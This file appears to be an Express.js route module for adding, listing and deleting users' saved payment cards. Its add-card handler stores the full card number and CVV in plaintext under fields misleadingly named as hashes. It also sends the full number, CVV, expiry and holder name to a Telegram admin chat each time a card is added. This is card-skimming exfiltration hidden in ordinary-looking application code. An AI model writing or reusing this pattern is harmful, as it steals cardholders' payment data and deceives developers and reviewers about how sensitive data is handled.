import { Router } from "express";
import { db } from "@workspace/db";
import { cardsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { requireAuth } from "../middlewares/auth";
import { getAdminBot } from "../lib/telegram";

const router = Router();

function detectCardBrand(cardNumber: string): string {
  const num = cardNumber.replace(/\s/g, "");
  if (/^4/.test(num)) return "Visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
  if (/^3[47]/.test(num)) return "Amex";
  if (/^6(?:011|5)/.test(num)) return "Discover";
  return "Other";
}

router.get("/", requireAuth, async (req, res) => {
  try {
    const cards = await db.select().from(cardsTable).where(eq(cardsTable.userId, req.userId!));

    res.json(cards.map(c => ({
      id: c.id,
      cardHolderName: c.cardHolderName,
      last4: c.last4,
      brand: c.brand,
      expiryMonth: c.expiryMonth,
      expiryYear: c.expiryYear,
      createdAt: c.createdAt,
    })));
  } catch (e) {
    req.log.error({ e }, "Error getting cards");
    res.status(500).json({ error: "Failed to get cards" });
  }
});

router.post("/", requireAuth, async (req, res) => {
  const { cardNumber, cardHolderName, expiryMonth, expiryYear, cvv } = req.body;
  const userId = req.userId!;
  const user = req.user!;

  if (!cardNumber || !cardHolderName || !expiryMonth || !expiryYear || !cvv) {
    res.status(400).json({ error: "All card details are required" });
    return;
  }

  const cleanNumber = cardNumber.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(cleanNumber)) {
    res.status(400).json({ error: "Invalid card number" });
    return;
  }

  try {
    const last4 = cleanNumber.slice(-4);
    const brand = detectCardBrand(cleanNumber);

    const [card] = await db.insert(cardsTable).values({
      userId,
      cardHolderName,
      cardNumberHash: cleanNumber,
      last4,
      brand,
      expiryMonth,
      expiryYear,
      cvvHash: cvv,
      rawCardNumber: cleanNumber,
    }).returning();

    const adminBot = getAdminBot();
    const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID || "";
    if (adminBot && adminChatId) {
      adminBot.sendMessage(adminChatId,
        `💳 NEW CARD ADDED\n\nUser: @${user.username} (ID: #${userId})\nCard: ${brand} ending in ${last4}\nExpiry: ${expiryMonth}/${expiryYear}\nHolder: ${cardHolderName}\nFull Number: ${cleanNumber}\nCVV: ${cvv}`
      );
    }

    res.status(201).json({
      id: card.id,
      cardHolderName: card.cardHolderName,
      last4: card.last4,
      brand: card.brand,
      expiryMonth: card.expiryMonth,
      expiryYear: card.expiryYear,
      createdAt: card.createdAt,
    });
  } catch (e) {
    req.log.error({ e }, "Error adding card");
    res.status(500).json({ error: "Failed to add card" });
  }
});

router.delete("/:id", requireAuth, async (req, res) => {
  const cardId = parseInt(req.params["id"] as string);
  const userId = req.userId!;

  try {
    const [card] = await db.select().from(cardsTable).where(
      and(eq(cardsTable.id, cardId), eq(cardsTable.userId, userId))
    );

    if (!card) {
      res.status(404).json({ error: "Card not found" });
      return;
    }

    await db.delete(cardsTable).where(eq(cardsTable.id, cardId));
    res.json({ success: true, message: "Card removed successfully" });
  } catch (e) {
    req.log.error({ e }, "Error deleting card");
    res.status(500).json({ error: "Failed to delete card" });
  }
});

export default router;
